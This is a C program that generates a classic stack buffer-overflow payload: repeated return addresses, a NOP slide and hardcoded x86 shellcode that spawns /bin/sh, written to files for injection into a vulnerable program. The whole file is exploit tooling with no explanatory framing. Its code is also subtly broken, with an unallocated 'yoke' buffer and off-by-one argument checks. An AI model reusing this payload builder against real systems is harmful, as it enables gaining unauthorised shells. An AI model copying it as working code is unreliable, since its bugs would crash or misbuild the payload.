#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

/************************************************
*   Builds an egg for small buffer overflows    *
*                                               *
*       Parts:                                  *
*        ----------------                       *
*       | Address Blocks |                      *
*        ----------------                       *
*       | Address Blocks |                      *
*        ----------------                       *
*       | Process Memory |                      *
*        ----------------                       *
*       | Process Memory |                      *
*        ----------------                       *
*       |    NOP slide   |                      *
*        ----------------                       *
*       |    Shellcode   |                      *
*        ----------------                       *
*                                               *
* REMINDER: Addr. Block must be aligned on a    *
*   long boundary. Shellcode is hardcoded to    *
*   make alignment easier. If shellcode is      *
*   modified, user must also alter SHELLSZ var. *
************************************************/

#define SHELLSZ     45
#define NOP         0x90
#define OFFSZ       0
#define ADDSZ       64
#define ADJ         0
#define SLIDESZ     2000

// Current shellcode: Unix - /bin/sh
char mkshell[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
    "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
    "\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
    
int main(int argc, char *argv[]) {
    char *buf, *ptr, *yoke;
    unsigned long **addp;
    unsigned long nopsz, shellsz, addsz, ysize, adj, offset, addr;
    int i,fd;
    
    offset = (unsigned long)OFFSZ;
    nopsz = (unsigned long)SLIDESZ;
    addsz = (unsigned long)ADDSZ;
    adj = (unsigned long)ADJ;
    
    if (argc < 3 || argc > 5) {
        fprintf(stderr, "Usage: %s <nop slide len.> <address block len.> <Address> [offset] [Adjustment]\n", argv[0]);
        exit(-1);
    }

    errno = 0;
    nopsz = strtol(argv[1], NULL, 0);
    addsz = strtol(argv[2], NULL, 0);
    addr = strtoul(argv[3], NULL, 0);
    
    if (argc > 3)
        offset = strtol(argv[4], NULL, 0);
    if (argc > 4)
        adj = strtol(argv[5], NULL, 0);
    if (errno != 0) {
        fprintf(stderr, "Usage: %s <nop slide len.> <address block len.> <Address> [offset] [Adjustment]\n", argv[0]);
        fprintf(stderr,"    Error: Non-decimal argument\n");
        exit(-1);
    }    
    
    shellsz = (unsigned long)SHELLSZ;
    addr = (unsigned long)(addr + offset);
    
    printf("    RET Structure\n");
    printf("        Number of Addr. in Addr Block   %lu\n", addsz);
    printf("        Adjustment Size                 %lu\n", adj);
    printf("        Address Data\n");
    printf("          Offset                        %lu\n", offset);
    printf("          Stack Address                 %x\n", addr);
    printf("        Total RET size (adds+adj+5)     %lu\n", 4*addsz+adj+5);
    printf("    Egg/Yoke Structure\n");
    printf("        NOP Slide Size                  %lu\n", nopsz);
    printf("        Shellcode Size                  %lu\n", shellsz);
    
    ysize = nopsz+shellsz;
    
    if ( !(buf = malloc(4*addsz+adj+5)) ) {
        printf("Malloc Failed!\n");
        exit(0);
    }
    printf("Using address: %p\n", (char *)addr);
    ptr = buf + 4;
    for (i = 0; i < adj; i++) {
        *(ptr++) = NOP;
    }

    addp = (unsigned long **) ptr;
    for (i = 0; i < addsz; i++)
        *(addp++) = (unsigned long *)addr;
    
    ptr = yoke;
    for (i = 0; i < nopsz; i++)
        *(ptr++) = NOP;
    
    for (i = 0; i < shellsz; i++)
        *(ptr++) = mkshell[i];
        
    buf[4*addsz + 4 + adj] = '\0';
    yoke[nopsz + shellsz] = '\0';
    
    if((fd = open("overflow",O_WRONLY|O_CREAT|O_TRUNC,0600)) < 0) {
        perror("overflow");
        exit(-1);
    }
    write(fd,buf,addsz+1);
    
    if((fd = open("river",O_WRONLY|O_CREAT|O_TRUNC,0600)) < 0) {
        perror("river");
        exit(-1);
    }
    write(fd,yoke,ysize+1);

    return(0);
}
    
    
    
    
    
    
    
    
